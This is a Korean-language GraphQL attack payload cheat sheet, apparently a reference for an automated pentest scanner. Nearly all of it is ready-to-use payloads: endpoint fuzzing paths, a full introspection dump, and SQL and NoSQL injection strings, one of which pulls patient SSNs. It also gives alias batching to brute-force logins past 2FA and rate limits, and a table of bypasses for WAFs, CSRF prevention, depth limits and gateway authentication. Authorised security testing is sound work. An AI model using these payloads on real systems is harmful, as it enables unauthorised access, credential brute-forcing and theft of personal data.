### 정찰 페이로드

엔드포인트 후보 경로 (서버 직접 fuzzing):
- `/graphql`, `/graphiql`, `/graphql/console`, `/graphql.php`, `/graphiql.php`
- `/v1/graphql`, `/v1/explorer`, `/v1/graphiql`
- `/api/graphql`, `/api/v1/graphql`
- `/graph`, `/altair`, `/playground`, `/voyager`
- 확장 wordlist: [SecLists/graphql.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/graphql.txt)

GET vs POST 진입점 식별:
- `GET /graphql?query={__schema{types{name}}}`
- `GET /graphiql?query={__schema{types{name}}}`
- `POST /graphql` body `{"query":"{__schema{types{name}}}"}`

에러 노출 확인:
- `?query={__schema}`
- `?query={}`
- `?query={thisdefinitelydoesnotexist}` — Field suggestion으로 schema 추론

Introspection 전체 dump:
```
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

특정 타입 정의:
- `{__type(name:"User"){name fields{name type{name kind ofType{name kind}}}}}`

타입 도달 경로 enumeration: [graphql-path-enum](https://github.com/dee-see/graphql-path-enum)

---

### 기본 페이로드

#### Query (shorthand / 명시)
```
{ user { id name } }
query { user { id name } }
```

#### Query with arguments
- `{ user(id: "1") { name email } }` (body) — IDOR 진입점
- `{ user(id: "1' OR '1'='1") { id } }` (body) — SQLi 가능 sink (sqli-scanner 결합)

#### Nested query (관계 traversal)
```
{ user(id:"1") { name posts { title comments { content author { email } } } } }
```

#### Mutation (인증/상태 변경)
```
mutation { signIn(login:"admin", password:"any"){ token } }
mutation { addUser(id:"1", name:"x", email:"x@x.com"){ id } }
mutation { deleteUser(id:"OTHER_USER_ID") }
```

#### Subscription (인증 우회 채널)
```
subscription { newMessage { id content sender } }
subscription { userUpdates(userId:"OTHER") { email } }
```

#### JSON list batching
```
[{"query":"{user(id:\"1\"){name}}"},{"query":"{user(id:\"2\"){name}}"},{"query":"{user(id:\"3\"){name}}"}]
```

#### Alias batching (rate limit/2FA 우회)
```
mutation {
  login(pass:1111, username:"bob")
  a2: login(pass:2222, username:"bob")
  a3: login(pass:3333, username:"bob")
  a4: login(pass:4444, username:"bob")
}
```

#### Query name based batching
```
{"query":"query { qname: Query { field1 } qname1: Query { field1 } }"}
```

#### Field에 SQL injection (sqli-scanner 결합)
- `{ bacon(id:"1'") { id type price } }` — single quote
- `{ user(name:"x';SELECT pg_sleep(5);--") { id email } }` — Time-based

#### Field에 NoSQL injection (nosqli-scanner 결합)
```
{ doctors(
    options:"{\"limit\":1,\"patients.ssn\":1}",
    search:"{\"patients.ssn\":{\"$regex\":\".*\"},\"lastName\":\"Admin\"}"
  ) { firstName lastName id patients{ssn} } }
```

#### `node(id:)` global resolver (Relay)
- `{ node(id:"VXNlcjox") { ...on User { email phone } } }` — Base64 ID로 임의 타입
- `{ node(id:"QWRtaW46MQ==") { ...on Admin { secrets } } }`

#### JSON scalar 인젝션
- `{ search(filter:{role:{$ne:"none"}}) { id } }` — scalar JSON에 NoSQL 연산자

#### File upload (multipart spec, graphql-upload)
```
operations: {"query":"mutation($f:Upload!){singleUpload(file:$f){id}}","variables":{"f":null}}
map: {"0":["variables.f"]}
0: <파일>
```

#### WebSocket subscription (graphql-ws)
```
{"type":"connection_init","payload":{}}
{"type":"subscribe","id":"1","payload":{"query":"subscription{userUpdates{id email}}"}}
```

---

### 우회 페이로드

| 방어 | 우회 페이로드 |
|---|---|
| Introspection 비활성 (`introspection:false`) | Field suggestion (`{badField}` → "Did you mean ...?"), `__typename` 단독 허용 케이스, `__type(name:"User")` 부분 |
| Introspection 일부만 차단 (`__schema`만) | `__type` 직접 호출, 타입별 rotation |
| Depth limit N | 동일 depth 내 필드 폭 (horizontal fan-out): `{a{x y z} b{x y z} c{x y z}...}` |
| Complexity limit (cost-based) | DataLoader 사용 시 비용 0 — N+1 fan-out, alias로 단일 쿼리 N회 |
| Rate limit per user | anonymous query, alias batching으로 단일 요청 N회, `X-Forwarded-For` 변경 |
| Persisted query allowlist | allowlist의 query에 임의 variable 주입 (인자 검증 누락) |
| `csrfPrevention: true` (Apollo) | `Content-Type: text/plain` 또는 `application/x-www-form-urlencoded`로 simple request, GET query 허용 시 |
| GET mutation 차단 | POST에 `?query=mutation{...}` 또는 batching 안 mutation |
| WAF 키워드 (`__schema`) | `__schema`를 fragment로 분할, alias로 wrapping |
| HTTP method 화이트리스트 | `POST`만 허용 시 `X-HTTP-Method-Override: POST` + GET (method-tampering 결합) |
| Federation gateway 인증 | subgraph 직접 호출 (`_entities` query) |
| Field-level 인가 | 중첩 resolver `{user{posts{owner{...}}}}` — outer만 인가하면 inner 노출 |
| `crit` extension 무시 | `@defer`, `@stream` directive로 응답 분할 — 중간 평가 우회 |

#### 인코딩/syntax 변형 우회
- URL encoding: `query=%7B__schema%7Btypes%7Bname%7D%7D%7D`
- Unicode escape in field name: `__\u0073chema`
- Inline fragment 활용: `{...on User{email}}` — 타입 검사 우회

---

### 참고사항

- "Did you mean ...?" 응답이 schema 추론의 핵심 — introspection 비활성 환경에서 가장 강력
- Apollo Server 4+ `csrfPrevention: true` 기본 — `Content-Type` 변형으로 우회 시도
- Hasura/PostGraphile 같은 자동 생성 GraphQL은 권한 매핑 디테일 누락 빈번
- WebSocket (graphql-ws)은 `connection_init`에서만 인증하면 메시지 권한 누락 사례 다수
- DataLoader 미사용 시 N+1 자동 발생 — complexity 제한도 우회됨
- Apollo Studio sandbox / GraphQL Playground / Voyager가 prod 노출되면 그 자체로 심각
- introspection 활성화는 의도적 공개 API일 수 있으나 에이전트 판단 불가 → 무조건 후보 + 전제 명시
- Federation gateway 환경은 subgraph URL을 별도 enumeration 필요 (gateway 우회용)
- Subscription은 long-lived connection — 권한 변경 후에도 stream 유지 가능 (재검증 누락)
- Alias batching은 단일 HTTP 요청에 1000개 mutation 가능 — brute force 게이트
- `node(id:)`는 Relay spec global resolver — 모든 타입을 Base64 ID로 조회 시도
- GraphQL over GET은 introspection 도구의 standard — 단, mutation은 GET 지양 (RFC)
- 응답에 stack trace/내부 경로 노출 시 `INFO_LEAK` 라벨 추가
- 다중 계정 테스트 권장 — 중첩 resolver 인가 누락 검증
